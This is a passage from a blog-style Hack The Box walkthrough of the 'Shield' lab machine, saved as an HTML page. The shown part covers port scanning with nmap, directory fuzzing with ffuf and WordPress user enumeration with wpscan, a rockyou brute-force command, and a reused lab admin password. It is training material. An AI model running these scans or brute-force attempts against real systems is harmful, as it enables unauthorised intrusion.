@@ -1,0 +1,911 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <title>Shield Walkthrough</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="preload" href="../assets/css/app.css%3Fv=5e4dc0b160.css" as="style" />
+    <link rel="preload" href="../assets/js/manifest.js%3Fv=5e4dc0b160" as="script" />
+    <link rel="preload" href="../assets/js/vendor/content-api.min.js%3Fv=5e4dc0b160" as="script" />
+    <link rel="preload" href="../assets/js/vendor.js%3Fv=5e4dc0b160" as="script" />
+    <link rel="preload" href="../assets/js/app.js%3Fv=5e4dc0b160" as="script" />
+    <link rel="preconnect" href="https://polyfill.io">
+    <link rel="dns-prefetch" href="https://polyfill.io">
+
+      <link rel="preload" href="../assets/css/post.css%3Fv=5e4dc0b160.css" as="style" />
+  <link rel="preload" href="../assets/js/post.js%3Fv=5e4dc0b160" as="script" />
+
+
+    <style>
+      /* These font-faces are here to make fonts work if the Ghost instance is installed in a subdirectory */
+
+      /* source-sans-pro-regular */
+      @font-face {
+        font-family: 'Source Sans Pro';
+        font-style: normal;
+        font-weight: 400;
+        font-display: swap;
+        src: local('SourceSansPro-Regular'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-regular.woff2%3Fv=5e4dc0b160") format('woff2'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-regular.woff%3Fv=5e4dc0b160") format('woff');
+      }
+
+      /* source-sans-pro-600 */
+      @font-face {
+        font-family: 'Source Sans Pro';
+        font-style: normal;
+        font-weight: 600;
+        font-display: swap;
+        src: local('SourceSansPro-SemiBold'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-600.woff2%3Fv=5e4dc0b160") format('woff2'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-600.woff%3Fv=5e4dc0b160") format('woff');
+      }
+
+      /* source-sans-pro-700 */
+      @font-face {
+        font-family: 'Source Sans Pro';
+        font-style: normal;
+        font-weight: 700;
+        font-display: swap;
+        src: local('SourceSansPro-Bold'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-700.woff2%3Fv=5e4dc0b160") format('woff2'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-700.woff%3Fv=5e4dc0b160") format('woff');
+      }
+
+      /* iconmoon */
+      @font-face {
+        font-family: 'icomoon';
+        font-weight: normal;
+        font-style: normal;
+        font-display: swap;
+        src: url("../assets/fonts/icomoon/icomoon.eot%3F101fc3%3Fv=5e4dc0b160");
+        src: url("../assets/fonts/icomoon/icomoon.eot%3F101fc3") format('embedded-opentype'),
+        url("../assets/fonts/icomoon/icomoon.ttf%3F101fc3%3Fv=5e4dc0b160") format('truetype'),
+        url("../assets/fonts/icomoon/icomoon.woff%3F101fc3%3Fv=5e4dc0b160") format('woff'),
+        url("../assets/fonts/icomoon/icomoon.svg%3F101fc3") format('svg');
+      }
+    </style>
+
+    <link rel="stylesheet" type="text/css" href="../assets/css/app.css%3Fv=5e4dc0b160.css" media="screen" />
+
+      <link rel="stylesheet" type="text/css" href="../assets/css/post.css%3Fv=5e4dc0b160.css" media="screen" />
+
+
+    
+
+    <link rel="icon" href="../favicon.ico" type="image/x-icon" />
+    <link rel="canonical" href="index.html" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    <link rel="amphtml" href="amp/index.html" />
+    
+    <meta property="og:site_name" content="h4rithd.com" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="Shield Walkthrough" />
+    <meta property="og:description" content="After the Vaccine Walkthrough, here I&#x27;m with Shield box. Let&#x27;s hack and grab the flags. As I mentioned before, the starting point machines are a series of 9 easily rated machines that should be rooted in sequence. So it means, if you need to go through this box, first of" />
+    <meta property="og:url" content="http://192.168.8.3:2368/starting-point-htb-shield-walkthrough/" />
+    <meta property="og:image" content="http://192.168.8.3:2368/content/images/2021/05/4.jpg" />
+    <meta property="article:published_time" content="2021-04-30T22:08:00.000Z" />
+    <meta property="article:modified_time" content="2021-05-26T22:24:23.000Z" />
+    <meta property="article:tag" content="h4rithd" />
+    <meta property="article:tag" content="HackTheBox" />
+    <meta property="article:tag" content="HarithDilshan" />
+    <meta property="article:tag" content="HTB Walkthrough" />
+    <meta property="article:tag" content="HTB Writeup" />
+    <meta property="article:tag" content="StartingPoint" />
+    <meta property="article:tag" content="Writeup" />
+    <meta property="article:tag" content="Shield Walkthrough" />
+    <meta property="article:tag" content="Shield" />
+    
+    <meta property="article:publisher" content="https://www.facebook.com/ShapManasick" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Shield Walkthrough" />
+    <meta name="twitter:description" content="After the Vaccine Walkthrough, here I&#x27;m with Shield box. Let&#x27;s hack and grab the flags. As I mentioned before, the starting point machines are a series of 9 easily rated machines that should be rooted in sequence. So it means, if you need to go through this box, first of" />
+    <meta name="twitter:url" content="http://192.168.8.3:2368/starting-point-htb-shield-walkthrough/" />
+    <meta name="twitter:image" content="http://192.168.8.3:2368/content/images/2021/05/4.jpg" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Harith Dilshan" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="h4rithd, HackTheBox, HarithDilshan, HTB Walkthrough, HTB Writeup, StartingPoint, Writeup, Shield Walkthrough, Shield" />
+    <meta name="twitter:site" content="@h4rithd" />
+    <meta property="og:image:width" content="1920" />
+    <meta property="og:image:height" content="1182" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "h4rithd.com",
+        "url": "http://192.168.8.3:2368/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "http://192.168.8.3:2368/content/images/2021/05/my.png",
+            "width": 60,
+            "height": 60
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Harith Dilshan",
+        "image": {
+            "@type": "ImageObject",
+            "url": "http://192.168.8.3:2368/content/images/2021/05/176773693_2267679413366261_3955357600281674809_n-2.jpg",
+            "width": 2000,
+            "height": 2000
+        },
+        "url": "http://192.168.8.3:2368/author/harith/",
+        "sameAs": []
+    },
+    "headline": "Shield Walkthrough",
+    "url": "http://192.168.8.3:2368/starting-point-htb-shield-walkthrough/",
+    "datePublished": "2021-04-30T22:08:00.000Z",
+    "dateModified": "2021-05-26T22:24:23.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "http://192.168.8.3:2368/content/images/2021/05/4.jpg",
+        "width": 1920,
+        "height": 1182
+    },
+    "keywords": "h4rithd, HackTheBox, HarithDilshan, HTB Walkthrough, HTB Writeup, StartingPoint, Writeup, Shield Walkthrough, Shield",
+    "description": "After the Vaccine Walkthrough, here I&#x27;m with Shield box. Let&#x27;s hack and grab the\nflags.\n\n\n--------------------------------------------------------------------------------\n\nAs I mentioned before, the starting point machines are a series of 9 easily\nrated machines that should be rooted in sequence. So it means, if you need to go\nthrough this box, first of all you must have a complete Vaccine\n[/@shapmanasick/s/starting-point-htb/vaccine-walkthrough]machine.\n\nEnough talks, 🥱 Let’s Get It Started 🐱",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://192.168.8.3:2368/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 4.6" />
+    <link rel="alternate" type="application/rss+xml" title="h4rithd.com" href="../rss/index.html" />
+    <script defer src="https://unpkg.com/@tryghost/portal@~1.4.0/umd/portal.min.js" data-ghost="http://192.168.8.3:2368/"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style><style>:root {--ghost-accent-color: #006ac7;}</style>
+
+    <script>
+      // @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&dn=expat.txt Expat
+      const ghostHost = "http://192.168.8.3:2368"
+      // @license-end
+    </script>
+  </head>
+  <body class="post-template tag-h4rithd tag-hackthebox tag-harithdilshan tag-htb-walkthrough tag-htb-writeup tag-startingpoint tag-writeup tag-shield-walkthrough tag-shield">
+    
+
+
+
+  
+<header class="m-header with-picture js-header">
+  <div class="m-mobile-topbar" data-aos="fade-down">
+    <button class="m-icon-button in-mobile-topbar js-open-menu" aria-label="Open menu">
+      <span class="icon-menu" aria-hidden="true"></span>
+    </button>
+      <a href="../index.html" class="m-logo in-mobile-topbar">
+        <img src="../content/images/2021/05/my.png" alt="h4rithd.com">
+      </a>
+    <button class="m-icon-button in-mobile-topbar js-open-search" aria-label="Open search">
+      <span class="icon-search" aria-hidden="true"></span>
+    </button>
+  </div>
+
+  <div class="m-menu js-menu">
+    <button class="m-icon-button outlined as-close-menu js-close-menu" aria-label="Close menu">
+      <span class="icon-close"></span>
+    </button>
+    <div class="m-menu__main" data-aos="fade-down">
+      <div class="l-wrapper">
+        <div class="m-nav js-main-nav">
+          <nav class="m-nav__left js-main-nav-left" role="navigation" aria-label="Main menu">
+            <ul>
+                <li class="only-desktop">
+                  <a href="../index.html" class="m-logo">
+                    <img src="../content/images/2021/05/my.png" alt="h4rithd.com">
+                  </a>
+                </li>
+                
+    <li class="nav-me">
+      <a href="https://h4rithd.com/">Me</a>
+    </li>
+    <li class="nav-blog">
+      <a href="https://h4rithd.com/blog/">Blog</a>
+    </li>
+
+              <li class="submenu-option js-submenu-option">
+                <button class="m-icon-button in-menu-main more js-toggle-submenu" aria-label="Open submenu">
+                  <span class="icon-more" aria-hidden="true"></span>
+                </button>
+                <div class="m-submenu js-submenu">
+                  <div class="l-wrapper in-submenu">
+                    <section class="m-recent-articles">
+                      <h3 class="m-submenu-title in-recent-articles">Recent articles</h3>
+                          <div class="glide js-recent-slider">
+                            <div class="glide__track" data-glide-el="track">
+                              <div class="glide__slides">
+                                <div class="glide__slide">
+                                  <a href="../starting-point-htb-included-walkthrough/index.html" class="m-recent-article">
+                                    <div class="m-recent-article__picture ">
+                                        <img src="../content/images/size/w300/2021/05/6.jpg" loading="lazy" alt="">
+                                    </div>
+                                    <h3 class="m-recent-article__title js-recent-article-title" title="Included Walkthrough">
+                                      Included Walkthrough
+                                    </h3>
+                                    <span class="m-recent-article__date">2 days ago</span>
+                                  </a>
+                                </div>
+                                <div class="glide__slide">
+                                  <a href="../starting-point-htb-pathfinder-walkthrough/index.html" class="m-recent-article">
+                                    <div class="m-recent-article__picture ">
+                                        <img src="../content/images/size/w300/2021/05/5.jpg" loading="lazy" alt="">
+                                    </div>
+                                    <h3 class="m-recent-article__title js-recent-article-title" title="Pathfinder Walkthrough">
+                                      Pathfinder Walkthrough
+                                    </h3>
+                                    <span class="m-recent-article__date">20 days ago</span>
+                                  </a>
+                                </div>
+                                <div class="glide__slide">
+                                  <a href="index.html" class="m-recent-article">
+                                    <div class="m-recent-article__picture ">
+                                        <img src="../content/images/size/w300/2021/05/4.jpg" loading="lazy" alt="">
+                                    </div>
+                                    <h3 class="m-recent-article__title js-recent-article-title" title="Shield Walkthrough">
+                                      Shield Walkthrough
+                                    </h3>
+                                    <span class="m-recent-article__date">a month ago</span>
+                                  </a>
+                                </div>
+                                <div class="glide__slide">
+                                  <a href="../vaccine-walkthrough/index.html" class="m-recent-article">
+                                    <div class="m-recent-article__picture ">
+                                        <img src="../content/images/size/w300/2021/05/3.jpg" loading="lazy" alt="">
+                                    </div>
+                                    <h3 class="m-recent-article__title js-recent-article-title" title="Vaccine Walkthrough">
+                                      Vaccine Walkthrough
+                                    </h3>
+                                    <span class="m-recent-article__date">a month ago</span>
+                                  </a>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                    </section>
+                    <section class="m-tags">
+                      <h3 class="m-submenu-title">Tags</h3>
+                        <ul>
+                            <li>
+                              <a href="../tag/archetype-walkthrough/index.html">Archetype Walkthrough</a>
+                            </li>
+                            <li>
+                              <a href="../tag/htb-walkthrough/index.html">HTB Walkthrough</a>
+                            </li>
+                            <li>
+                              <a href="../tag/htb-writeup/index.html">HTB Writeup</a>
+                            </li>
+                            <li>
+                              <a href="../tag/hackthebox/index.html">HackTheBox</a>
+                            </li>
+                            <li>
+                              <a href="../tag/harithdilshan/index.html">HarithDilshan</a>
+                            </li>
+                            <li>
+                              <a href="../tag/included/index.html">Included</a>
+                            </li>
+                            <li>
+                              <a href="../tag/included-walkthrough/index.html">Included Walkthrough</a>
+                            </li>
+                            <li>
+                              <a href="../tag/oopsie/index.html">Oopsie</a>
+                            </li>
+                            <li>
+                              <a href="../tag/oopsie-walkthrough/index.html">Oopsie Walkthrough</a>
+                            </li>
+                            <li>
+                              <a href="../tag/pathfinder/index.html">Pathfinder</a>
+                            </li>
+                        </ul>
+                    </section>
+                  </div>
+                </div>
+              </li>
+            </ul>
+          </nav>
+          <div class="m-nav__right">
+            <button class="m-icon-button in-menu-main js-open-search" aria-label="Open search">
+              <span class="icon-search" aria-hidden="true"></span>
+            </button>
+            <div class="m-toggle-darkmode js-tooltip" data-tippy-content="Toggle dark mode" tabindex="0">
+              <label for="toggle-darkmode" class="sr-only">
+                Toggle dark mode
+              </label>
+              <input id="toggle-darkmode" type="checkbox" class="js-toggle-darkmode">
+              <div>
+                <span class="icon-moon moon" aria-hidden="true"></span>
+                <span class="icon-sunny sun" aria-hidden="true"></span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+
+<main class="main-wrap">
+    
+  <section class="m-hero with-picture" data-aos="fade">
+    <div class="m-hero__picture in-post">
+      <img
+        srcset="../content/images/size/w300/2021/05/4.jpg21/05/4.jpg 300w../content/images/size/w600/2021/05/4.jpg021/05/4.jpg 600../content/images/size/w1000/2021/05/4.jpg2021/05/4.jpg 100../content/images/size/w2000/2021/05/4.jpg/2021/05/4.jpg 2000w
+        "
+        sizes="(max-width: 600px) 600px, (max-width: 1000px) 1000px, 2000px"
+        src="../content/images/size/w1000/2021/05/4.jpg"
+        alt=""
+      />
+    </div>
+    </section>
+  
+  <article>
+    <div class="l-content in-post">
+        <div class="l-wrapper in-post  js-aos-wrapper" data-aos="fade-up"
+          data-aos-delay="300">
+          <div
+            class="l-post-content js-progress-content">
+            <header class="m-heading">
+              <h1 class="m-heading__title in-post">Shield Walkthrough</h1>
+              <div class="m-heading__meta">
+                  <a href="../tag/h4rithd/index.html" class="m-heading__meta__tag">h4rithd</a>
+                  <span class="m-heading__meta__divider" aria-hidden="true">&bull;</span>
+                <span class="m-heading__meta__time">May 1, 2021</span>
+              </div>
+            </header>
+            <div class="pos-relative js-post-content">
+              <div class="m-share">
+                <div class="m-share__content js-sticky">
+                  <a href="https://www.facebook.com/sharer/sharer.php?u=http://192.168.8.3:2368/starting-point-htb-shield-walkthrough/"
+                    class="m-icon-button filled in-share" target="_blank" rel="noopener" aria-label="Facebook">
+                    <span class="icon-facebook" aria-hidden="true"></span>
+                  </a>
+                  <a href="https://twitter.com/intent/tweet?text=Shield%20Walkthrough&url=http://192.168.8.3:2368/starting-point-htb-shield-walkthrough/"
+                    class="m-icon-button filled in-share" target="_blank" rel="noopener" aria-label="Twitter">
+                    <span class="icon-twitter" aria-hidden="true"></span>
+                  </a>
+                  <button class="m-icon-button filled in-share progress js-scrolltop" aria-label="Scroll to top">
+                    <span class="icon-arrow-top" aria-hidden="true"></span>
+                    <svg aria-hidden="true">
+                      <circle class="progress-ring__circle js-progress" fill="transparent" r="0" />
+                    </svg>
+                  </button>
+                </div>
+              </div>
+              <p>After the Vaccine Walkthrough, here I'm with Shield box. Let's hack and grab the flags.</p><hr><p>As I mentioned before, the starting point machines are a series of 9 easily rated machines that should be <strong>rooted in sequence</strong>. So it means, if you need to go through this box, first of all you must have a complete <a href="http://192.168.8.3:2368/@shapmanasick/s/starting-point-htb/vaccine-walkthrough">Vaccine </a>machine.</p><p>Enough talks, 🥱 Let’s Get It Started 🐱‍💻</p><blockquote><strong>Disclaimers: </strong>No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedure to grab the flags! 🐱‍👤</blockquote><hr><h2 id="00-start-machine-%E2%80%A6">00. Start Machine …</h2><p>To start machine, just click "Join Machine".</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-39.png" class="kg-image" alt loading="lazy" width="1637" height="730" srcset="../content/images/size/w600/2021/05/image-39.png 600w, ../content/images/size/w1000/2021/05/image-39.png 1000w, ../content/images/size/w1600/2021/05/image-39.png 1600w, ../content/images/2021/05/image-39.png 1637w" sizes="(min-width: 720px) 720px"></figure><p>Then you can see the <strong>IP </strong>address for that machine. Usually it is <code><strong>10.10.10.29 </strong></code><strong>🤠</strong></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma8rCTSABTSH_XeG1Vi%2F-Ma8ssSW-inIrWZ0ACd2%2Fimage.png?alt=media&amp;token=b3e10e07-6b98-4526-a81c-461351c2569b" class="kg-image" alt loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Before going enumeration steps we can simply ping to the IP address and check our VPN connection and whether the machine is alive. Sometimes the machines might "Disable" ping requests from passing through the firewall. But in most cases ping will be a success! 🙂</p><pre><code class="language-bash">┌──(root💀Hidd3nWiki)-[~/Documents/Shield]
+└─# ping 10.10.10.29 -c 2
+PING 10.10.10.29 (10.10.10.29) 56(84) bytes of data.
+64 bytes from 10.10.10.29: icmp_seq=1 ttl=127 time=235 ms
+64 bytes from 10.10.10.29: icmp_seq=2 ttl=127 time=242 ms
+
+--- 10.10.10.29 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1003ms
+rtt min/avg/max/mdev = 234.989/238.250/241.512/3.261 ms</code></pre><blockquote>As a ping result, It's TTL=127. There is only one route between machine and us (VPN). So definitely it will be a Windows machine.</blockquote><hr><h2 id="01-enumeration-first-%E2%80%A6">01. Enumeration First …</h2><h3 id="011-fast-ports-scan">01.1 Fast ports scan</h3><p>As usual, run Nmap fast scan for all TCP ports to identify the ports which are open.</p><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.29</code></pre><pre><code class="language-bash">-n  : Never do DNS resolution
+-vv	: Extra verbosity
+--open	: Output only open ports
+-p-	: Full TCP ports range (65535)
+-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network</code></pre><p>Here is the output 👇</p><pre><code class="language-bash">┌──(root💀Hidd3nWiki)-[~/Documents/Shield]
+└─# nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.29
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 09:11 EDT
+Initiating Ping Scan at 09:11
+Scanning 10.10.10.29 [4 ports]
+Completed Ping Scan at 09:11, 0.30s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 09:11
+Scanning 10.10.10.29 [65535 ports]
+Discovered open port 3306/tcp on 10.10.10.29
+Discovered open port 80/tcp on 10.10.10.29
+SYN Stealth Scan Timing: About 6.12% done; ETC: 09:19 (0:07:56 remaining)
+SYN Stealth Scan Timing: About 14.99% done; ETC: 09:18 (0:05:46 remaining)
+SYN Stealth Scan Timing: About 24.54% done; ETC: 09:17 (0:04:40 remaining)
+SYN Stealth Scan Timing: About 32.52% done; ETC: 09:17 (0:04:11 remaining)
+SYN Stealth Scan Timing: About 39.61% done; ETC: 09:17 (0:03:50 remaining)
+SYN Stealth Scan Timing: About 53.18% done; ETC: 09:17 (0:02:39 remaining)
+SYN Stealth Scan Timing: About 70.11% done; ETC: 09:16 (0:01:30 remaining)
+Completed SYN Stealth Scan at 09:15, 253.94s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.29
+Host is up, received echo-reply ttl 127 (0.22s latency).
+Scanned at 2021-05-20 09:11:32 EDT for 254s
+Not shown: 65533 filtered ports
+Reason: 65533 no-responses
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE REASON
+80/tcp   open  http    syn-ack ttl 127
+3306/tcp open  mysql   syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 254.38 seconds
+           Raw packets sent: 131239 (5.774MB) | Rcvd: 170 (7.464KB)</code></pre><p>Really? There are only two ports open. 😑😑😶</p><h3 id="%E2%80%8C012-run-nmap-scripting-engine">‌01.2 Run Nmap Scripting Engine</h3><p>To get the best result, We can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all of the open ports and therefore we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">┌──(root💀Hidd3nWiki)-[~/Documents/Shield]
+└─# nmap -sV -sC -oN DetailPorts.nmap -p 80,3306 10.10.10.29
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 09:27 EDT
+Nmap scan report for 10.10.10.29
+Host is up (0.23s latency).
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+3306/tcp open  mysql   MySQL (unauthorized)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.56 seconds</code></pre><p>There are 2 main ports. One is running webserver and other one is running MySQL server. 🤷‍♂️🤷‍♂️</p><h3 id="013-discover-more-on-port-80">01.3 Discover more on port 80</h3><p>🕵️‍♀️ Now we have only two open ports, so I chose port 80 first. Now you have a pretty big idea about what we need to do with port 80 right? Let's open our web browser, type 10.10.10.29 and then hit enter.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-40.png" class="kg-image" alt loading="lazy" width="1354" height="747" srcset="../content/images/size/w600/2021/05/image-40.png 600w, ../content/images/size/w1000/2021/05/image-40.png 1000w, ../content/images/2021/05/image-40.png 1354w" sizes="(min-width: 720px) 720px"></figure><p><br>What the hell! Feel like there are more steps, 😖 Now we need to find whether there are any other directories here?</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-41.png" class="kg-image" alt loading="lazy" width="236" height="177"></figure><p><br>Again it's time to start fuzzing. I have already told you how to use <a href="https://app.gitbook.com/@shapmanasick/s/starting-point-htb/oopsie-walkthrough#02-foothold"><code>dirsearch</code></a>tool in <a href="https://app.gitbook.com/@shapmanasick/s/starting-point-htb/oopsie-walkthrough">oopsie </a>walkthrough. Now it's time to learn a new cool tool right. 😍😎 The tool is <a href="https://github.com/ffuf/ffuf" rel="noopener noreferrer"><code>ffuf</code></a>. A fast web fuzzer written in Go.</p><blockquote>You can download and install this tool by reading <a href="https://github.com/ffuf/ffuf#installation" rel="noopener noreferrer">this</a>. It must be installed on your OS if you are willing to face OSCP. Because it helps a lot more than ordinary <a href="https://tools.kali.org/web-applications/wfuzz" rel="noopener noreferrer"><code>Wfuzz</code></a>tool.</blockquote><p>Let's enumerate the web directories!!</p><pre><code class="language-bash">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.29/FUZZ</code></pre><p>Here is the output. 👇👇</p><pre><code class="language-bash">┌──(root💀Hidd3nWiki)-[~/Documents/Shield]
+└─# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.29/FUZZ        
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.2.1
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.29/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+                        [Status: 200, Size: 703, Words: 27, Lines: 32]
+wordpress               [Status: 301, Size: 152, Words: 9, Lines: 2]
+:: Progress: [4614/4614] :: Job [1/1] :: 155 req/sec :: Duration: [0:00:33] :: Errors: 0 ::</code></pre><p>So we have only one directory and it is wordpress. Let's jump to our web browser and navigate to the <code>http://10.10.10.29/wordpress</code></p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-42.png" class="kg-image" alt loading="lazy" width="1353" height="741" srcset="../content/images/size/w600/2021/05/image-42.png 600w, ../content/images/size/w1000/2021/05/image-42.png 1000w, ../content/images/2021/05/image-42.png 1353w" sizes="(min-width: 720px) 720px"></figure><p><br>Now you can see there is a wordpress site hosted on the server. So now, time to use <code>wpscan </code>tool. By using this tool we can do lots of things on Wordpress CMS like enumerating plugins, users, themes, backups and also we can use this tool to brute force wordpress passwords.</p><pre><code class="language-bash">wpscan --url http://10.10.10.29/wordpress -e u</code></pre><p>Here is the output. 👇👇</p><pre><code class="language-bash">┌──(root💀Hidd3nWiki)-[~/Documents/Shield]
+└─# wpscan --url http://10.10.10.29/wordpress -e u
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.14
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.10.10.29/wordpress/ [10.10.10.29]
+[+] Started: Thu May 20 10:33:23 2021
+
+  &lt;snap&gt;
+  ............
+  &lt;/snap&gt;
+
+[+] admin
+ | Found By: Rss Generator (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://10.10.10.29/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Thu May 20 10:33:31 2021
+[+] Requests Done: 13
+[+] Cached Requests: 42
+[+] Data Sent: 3.559 KB
+[+] Data Received: 9.893 KB
+[+] Memory used: 122.016 MB
+[+] Elapsed time: 00:00:08</code></pre><p>So as you can see there is only one user called <code>admin</code> in this wordpress site. Let's brute force that user using rockyou password.</p><pre><code class="language-bash">wpscan --url http://10.10.10.29/wordpress --usernames admin --passwords /usr/share/wordlists/rockyou.txt</code></pre><p>But wait, ✋✋</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma8rCTSABTSH_XeG1Vi%2F-Ma9Pbupd4vbukgizp1h%2Fimage.png?alt=media&amp;token=05b1b1e8-042d-42e7-84f6-e05912141401" class="kg-image" alt loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p><br>Password brute forcing is more time consuming here. Since these boxes are in sequence, we can check previous credentials. 🙄🙄 in vaccine walkthrough we had found some passwords, if you check one by one you will get the right one. here it is <code>P@s5w0rd! </code>  So the credentials for wordpress login are</p><p><code>admin : P@s5w0rd!</code></p><p>And if you are not familiar with wordpress sites, <code>/wp-admin</code> is the login page for most of the wordpress sites and it is the default login path. bla bla bala...</p><p>Anyway go to your browser again and navigate 